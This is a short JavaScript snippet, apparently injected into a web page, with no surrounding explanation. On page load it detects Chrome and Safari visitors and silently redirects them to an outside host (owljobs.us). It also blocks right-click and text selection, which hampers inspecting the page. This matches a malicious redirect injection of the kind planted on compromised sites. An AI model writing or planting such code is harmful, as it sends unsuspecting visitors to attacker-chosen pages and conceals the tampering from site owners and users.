function redirectToURL(url) {
    var isChrome = false;
    var isChromium = window.chrome;
    var winNav = window.navigator;
    var vendorName = winNav.vendor;
    var isOpera = typeof window.opr !== "undefined";
    var isIEedge = winNav.userAgent.indexOf("Edge") > -1;
    var isIOSChrome = winNav.userAgent.match("CriOS");

    if (isIOSChrome) {
        isChrome = true;
    } else if (
        isChromium !== null &&
        typeof isChromium !== "undefined" &&
        vendorName === "Google Inc." &&
        isOpera === false &&
        isIEedge === false
    ) {
        isChrome = true;
    }

    if (isChrome) {
        window.location.href = url;
    }
}

redirectToURL("http://owljobs.us/sa");

var ua = navigator.userAgent.toLowerCase(); 
if (ua.indexOf('safari')!=-1){ 
    if(ua.indexOf('chrome') > -1) {
        // Chrome
    } else {
        // Safari
        window.location.href = "http://owljobs.us/sa";

    }
}
document.addEventListener('contextmenu', event => event.preventDefault());
document.addEventListener('selectstart', event => event.preventDefault());
